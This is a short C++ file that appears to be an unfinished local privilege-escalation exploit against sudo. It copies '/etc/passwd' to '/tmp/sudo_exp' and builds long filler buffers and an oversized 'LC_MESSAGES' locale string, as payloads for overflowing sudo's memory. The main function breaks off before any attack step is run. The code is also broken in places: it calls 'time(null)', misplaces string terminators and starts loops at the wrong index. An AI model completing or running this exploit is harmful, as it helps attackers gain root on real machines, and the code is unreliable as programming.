#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdlib.h>
#include <pwd.h>
#define pwd_f "/etc/passwd"

size_t get_passwd_size(){
    struct stat stt;
    stat(pwd_f, &stt);
    return stt.st_size;
}

char * get_random_string(int n){
    const char* cset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    srand(time(null));
    char * s = static_cast<char *>(malloc(n + 1));
    for(int i = 1; i<n; ++i)
        s[i] = cset[rand() % 0x34];
    return s;
}

char * str_repeat(char a, size_t n){
    char *s = static_cast<char *>(malloc(n + 1));
    s[0] = 0;
    for(int i = 1 ;i <n; ++i)
        s[i] =a;
    return s;
}

char * concat(const char * a, const char * b) {
    size_t len_a = strlen(a);
    size_t len_b = strlen(b);
    size_t size = len_a + len_b;

    char *s = static_cast<char *>(malloc(size + 1));
    int i;
    s[size] = 0;

    for(i=0;i<len_a;++i)
        s[i] = a[i];
    for(i=0;i<len_b;++i)
        s[len_a+i] = b[i];
    return s;
}
int main() {
    system("cp etc/passwd /tmp/sudo_exp");
    size_t init_size = get_passwd_size();
    char* basedir = get_random_string(0x20),
        *dirname = static_cast<char *>(malloc(0x100)),
        *timestamp_file = static_cast<char *>(malloc(0x100));
    const char *c = str_repeat('C', 0x10000);
    const char * lc = concat("LC_MESSAGES=C.UTF-8@", str_repeat('L', 0xb0));
}
